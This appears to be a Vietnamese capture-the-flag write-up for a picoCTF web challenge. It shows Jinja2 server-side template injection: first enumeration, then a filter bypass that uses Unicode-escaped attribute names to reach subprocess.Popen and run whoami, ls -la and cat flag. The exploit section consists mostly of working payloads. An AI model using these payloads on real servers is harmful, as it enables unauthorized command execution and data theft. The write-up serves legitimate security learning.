![alt text](image.png)

## 1. Enumeration
Trang chủ 
![alt text](image-1.png)
Với đầu vào là

```bash
{{7*7}}
```
Ta thu được 
```bash
49
```

![alt text](image-2.png)
Với đầu vào là 

```bash
{{request}}
```

Ta thu được kết quả 

```bash
<Request 'http://shape-facility.picoctf.net:64084/announce' [POST]>
```
![alt text](image-3.png)

&rarr; **Khả năng là lỗ hổng SSTI trong framework Jinja2**

## 2. Exploit
Ta thử payload 
```bash 
{{ ''.__class__.__mro__ }}
```
![alt text](image-4.png)

Câu lệnh không được thực thi vì đã  lọc đầu vào .
Ta sử dụng Unicode encoding và duyệt qua vòng lặp để lấy được danh sách các class cha 

```bash
{% for item in 7 |attr("\u005f\u005fclass\u005f\u005f") |attr("\u005f\u005fmro\u005f\u005f") %}
    {{ item }}
{% endfor %}
```

![alt text](image-5.png)

Ta trỏ đến class object bằng cách  duyệt qua từng lớp trong orm để  bypass bộ lọc chặn truy cập trực tiếp vào đối tượng  
```bash
{% for item in 7 |attr("\u005f\u005fclass\u005f\u005f") |attr("\u005f\u005fmro\u005f\u005f") %}
    {% if "object" in item|string %}
        {{ item }}
    {% endif %}
{% endfor %}
```
![alt text](image-6.png)

Làm tương tự ta  liệt kê được  các lớp con  object bằng cách duyệt qua từng lớp trong lớp cha object để  bypass bộ lọc chặn truy cập trực tiếp vào đối tượng 

```bash
{% for item in 7 |attr("\u005f\u005fclass\u005f\u005f") |attr("\u005f\u005fmro\u005f\u005f") %}
    {% if "object" in item|string %}
        {{ item |attr("\u005f\u005fsubclasses\u005f\u005f")() }}
    {% endif %}
{% endfor %}
```

![alt text](image-7.png)

Tìm được có tồn tài class subprocess.Popen ( class có khả năng thực thi hệ thống )

![alt text](image-8.png)

Ta trỏ đến lớp subprocess.Popen thông qua payload này :
```bash
{% for item in 7 |attr("\u005f\u005fclass\u005f\u005f") |attr("\u005f\u005fmro\u005f\u005f") %}
    {% if "object" in item|string %}
        {% for cls in item |attr("\u005f\u005fsubclasses\u005f\u005f")() %}
            {% if "Popen" in cls|string %}
                {{ cls }}
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```

![alt text](image-9.png)

Ta sử dụng class subprocess.Popen để thực thi câu lệnh whoami 

```bash
{% for item in 7 |attr("\u005f\u005fclass\u005f\u005f") |attr("\u005f\u005fmro\u005f\u005f") %}
    {% if "object" in item|string %}
        {% for cls in item |attr("\u005f\u005fsubclasses\u005f\u005f")() %}
            {% if "Popen" in cls|string %}
                {{ cls(["whoami"],shell=True, stdout=-1, stderr=-1) |attr("\u0063\u006f\u006d\u006d\u0075\u006e\u0069\u0063\u0061\u0074\u0065")() }}
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```

Kết quả trả về câu lệnh whoami thực thi thành công .

![alt text](image-10.png)

Ta tiếp tục thực thi câu lệnh ls -la để liệt kê các thư mục hiện tại 
```bash
{% for item in 7 |attr("\u005f\u005fclass\u005f\u005f") |attr("\u005f\u005fmro\u005f\u005f") %}
    {% if "object" in item|string %}
        {% for cls in item |attr("\u005f\u005fsubclasses\u005f\u005f")() %}
            {% if "Popen" in cls|string %}
                {{ cls(["ls -la"],shell=True, stdout=-1, stderr=-1) |attr("\u0063\u006f\u006d\u006d\u0075\u006e\u0069\u0063\u0061\u0074\u0065")() }}
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```

![alt text](image-11.png)

Tìm được file flag ta đọc thực thi lệnh cat flag để đọc file 
```bash
{% for item in 7 |attr("\u005f\u005fclass\u005f\u005f") |attr("\u005f\u005fmro\u005f\u005f") %}
    {% if "object" in item|string %}
        {% for cls in item |attr("\u005f\u005fsubclasses\u005f\u005f")() %}
            {% if "Popen" in cls|string %}
                {{ cls(["cat flag"],shell=True, stdout=-1, stderr=-1) |attr("\u0063\u006f\u006d\u006d\u0075\u006e\u0069\u0063\u0061\u0074\u0065")() }}
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```
![alt text](image-12.png)